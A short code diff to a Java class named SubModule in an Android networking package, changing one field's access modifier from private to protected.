@@ -8,7 +8,7 @@ import com.android.networking.evidence.Markup;
 public abstract class SubModule {
 	
 	protected Markup markup;
-	private BaseModule module;
+	protected BaseModule module;
 	
 	public final void init(BaseModule module, Markup markup){
 		this.markup = markup;
